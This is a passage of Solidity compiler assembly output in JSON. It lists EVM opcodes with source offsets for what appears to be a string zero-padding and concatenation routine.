											"begin": 5914,
											"end": 5917,
											"name": "tag",
											"source": 0,
											"value": "138"
										},
										{
											"begin": 5914,
											"end": 5917,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5914,
											"end": 5917,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5914,
											"end": 5917,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5890,
											"end": 6034,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "125"
										},
										{
											"begin": 5890,
											"end": 6034,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5890,
											"end": 6034,
											"name": "tag",
											"source": 0,
											"value": "126"
										},
										{
											"begin": 5890,
											"end": 6034,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5890,
											"end": 6034,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6044,
											"end": 6058,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 6074,
											"end": 6077,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6061,
											"end": 6086,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 6044,
											"end": 6086,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 6044,
											"end": 6086,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6114,
											"end": 6115,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 6101,
											"end": 6110,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6101,
											"end": 6115,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 6097,
											"end": 6612,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "139"
										},
										{
											"begin": 6097,
											"end": 6612,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 6132,
											"end": 6152,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "140"
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "PUSH",
											"source": 0,
											"value": "3000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6178,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 6155,
											"end": 6162,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "49"
										},
										{
											"begin": 6155,
											"end": 6180,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "tag",
											"source": 0,
											"value": "140"
										},
										{
											"begin": 6155,
											"end": 6180,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6132,
											"end": 6180,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 6132,
											"end": 6180,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6202,
											"end": 6208,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6195,
											"end": 6208,
											"name": "SWAP6",
											"source": 0
										},
										{
											"begin": 6195,
											"end": 6208,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6195,
											"end": 6208,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6195,
											"end": 6208,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6195,
											"end": 6208,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6195,
											"end": 6208,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6195,
											"end": 6208,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6195,
											"end": 6208,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "114"
										},
										{
											"begin": 6195,
											"end": 6208,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6097,
											"end": 6612,
											"name": "tag",
											"source": 0,
											"value": "139"
										},
										{
											"begin": 6097,
											"end": 6612,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6243,
											"end": 6244,
											"name": "PUSH",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 6230,
											"end": 6239,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6230,
											"end": 6244,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 6226,
											"end": 6612,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "142"
										},
										{
											"begin": 6226,
											"end": 6612,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 6261,
											"end": 6281,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "143"
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "PUSH",
											"source": 0,
											"value": "3000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6304,
											"end": 6307,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 6284,
											"end": 6291,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "49"
										},
										{
											"begin": 6284,
											"end": 6309,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "tag",
											"source": 0,
											"value": "143"
										},
										{
											"begin": 6284,
											"end": 6309,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6261,
											"end": 6309,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 6261,
											"end": 6309,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6331,
											"end": 6337,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6324,
											"end": 6337,
											"name": "SWAP6",
											"source": 0
										},
										{
											"begin": 6324,
											"end": 6337,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6324,
											"end": 6337,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6324,
											"end": 6337,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6324,
											"end": 6337,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6324,
											"end": 6337,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6324,
											"end": 6337,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6324,
											"end": 6337,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "114"
										},
										{
											"begin": 6324,
											"end": 6337,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6226,
											"end": 6612,
											"name": "tag",
											"source": 0,
											"value": "142"
										},
										{
											"begin": 6226,
											"end": 6612,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6372,
											"end": 6373,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 6359,
											"end": 6368,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6359,
											"end": 6373,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 6355,
											"end": 6612,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "145"
										},
										{
											"begin": 6355,
											"end": 6612,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 6390,
											"end": 6410,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "146"
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "PUSH",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "PUSH",
											"source": 0,
											"value": "3030300000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6435,
											"end": 6438,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 6413,
											"end": 6420,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "49"
										},
										{
											"begin": 6413,
											"end": 6440,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "tag",
											"source": 0,
											"value": "146"
										},
										{
											"begin": 6413,
											"end": 6440,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6390,
											"end": 6440,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 6390,
											"end": 6440,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6462,
											"end": 6468,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6455,
											"end": 6468,
											"name": "SWAP6",
											"source": 0
										},
										{
											"begin": 6455,
											"end": 6468,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6455,
											"end": 6468,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6455,
											"end": 6468,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6455,
											"end": 6468,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6455,
											"end": 6468,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6455,
											"end": 6468,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6455,
											"end": 6468,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "114"
										},
										{
											"begin": 6455,
											"end": 6468,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6355,
											"end": 6612,
											"name": "tag",
											"source": 0,
											"value": "145"
										},
										{
											"begin": 6355,
											"end": 6612,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6503,
											"end": 6504,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 6490,
											"end": 6499,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6490,
											"end": 6504,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 6486,
											"end": 6612,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "148"
										},
										{
											"begin": 6486,
											"end": 6612,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 6521,
											"end": 6541,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "149"
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "PUSH",
											"source": 0,
											"value": "3030303000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6567,
											"end": 6570,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 6544,
											"end": 6551,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "49"
										},
										{
											"begin": 6544,
											"end": 6572,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "tag",
											"source": 0,
											"value": "149"
										},
										{
											"begin": 6544,
											"end": 6572,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6521,
											"end": 6572,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 6521,
											"end": 6572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6594,
											"end": 6600,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6587,
											"end": 6600,
											"name": "SWAP6",
											"source": 0
										},
										{
											"begin": 6587,
											"end": 6600,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6587,
											"end": 6600,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6587,
											"end": 6600,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6587,
											"end": 6600,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6587,
											"end": 6600,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6587,
											"end": 6600,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6587,
											"end": 6600,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "114"
										},
										{
											"begin": 6587,
											"end": 6600,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6486,
											"end": 6612,
											"name": "tag",
											"source": 0,
											"value": "148"
										},
										{
											"begin": 6486,
											"end": 6612,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6638,
											"end": 6641,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6624,
											"end": 6642,
											"name": "SWAP5",
											"source": 0
										},
										{
											"begin": 6624,
											"end": 6642,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6624,
											"end": 6642,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6624,
											"end": 6642,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6624,
											"end": 6642,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6624,
											"end": 6642,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5636,
											"end": 6650,
											"name": "tag",
											"source": 0,
											"value": "114"
										},
										{
											"begin": 5636,
											"end": 6650,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5636,
											"end": 6650,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5636,
											"end": 6650,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5636,
											"end": 6650,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5636,
											"end": 6650,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 12328,
											"end": 12958,
											"name": "tag",
											"source": 0,
											"value": "49"
										},
										{
											"begin": 12328,
											"end": 12958,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12411,
											"end": 12424,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 12437,
											"end": 12460,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 12469,
											"end": 12474,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 12437,
											"end": 12475,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12437,
											"end": 12475,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12486,
											"end": 12510,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 12519,
											"end": 12525,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 12486,
											"end": 12526,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12486,
											"end": 12526,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12539,
											"end": 12562,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 12596,
											"end": 12607,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 12596,
											"end": 12614,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 12576,
											"end": 12586,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 12576,
											"end": 12593,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 12576,
											"end": 12614,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "151"
										},
										{
											"begin": 12576,
											"end": 12614,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 12576,
											"end": 12614,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12576,
											"end": 12614,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "81"
										},
										{
											"begin": 12576,
											"end": 12614,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 12576,
											"end": 12614,
											"name": "tag",
											"source": 0,
											"value": "151"
										},
										{
											"begin": 12576,
											"end": 12614,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFF"
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "152"
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "153"
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "123"
										},
										{
											"begin": 12565,
											"end": 12615,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "tag",
											"source": 0,
											"value": "153"
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "tag",
											"source": 0,
											"value": "152"
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "154"
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "CALLDATACOPY",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "tag",
											"source": 0,
											"value": "154"
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12565,
											"end": 12615,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12539,
											"end": 12615,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12539,
											"end": 12615,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12626,
											"end": 12648,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 12657,
											"end": 12666,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 12626,
											"end": 12667,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12626,
											"end": 12667,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12680,
											"end": 12686,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 12697,
											"end": 12703,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 12722,
											"end": 12723,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 12720,
											"end": 12723,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 12720,
											"end": 12723,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12716,
											"end": 12808,
											"name": "tag",
											"source": 0,
											"value": "155"
										},
										{
											"begin": 12716,
											"end": 12808,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12727,
											"end": 12737,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 12727,
											"end": 12744,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 12725,
											"end": 12726,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 12725,
											"end": 12744,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 12716,
											"end": 12808,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 12716,
											"end": 12808,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "156"
										},
										{
											"begin": 12716,
											"end": 12808,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 12783,
											"end": 12793,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 12794,
											"end": 12795,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "158"
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "159"
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "79"
										},
										{
											"begin": 12783,
											"end": 12796,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "tag",
											"source": 0,
											"value": "159"
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "tag",
											"source": 0,
											"value": "158"
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 12783,
											"end": 12796,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 12766,
											"end": 12775,
											"name": "DUP4",
											"source": 0
										},
										{
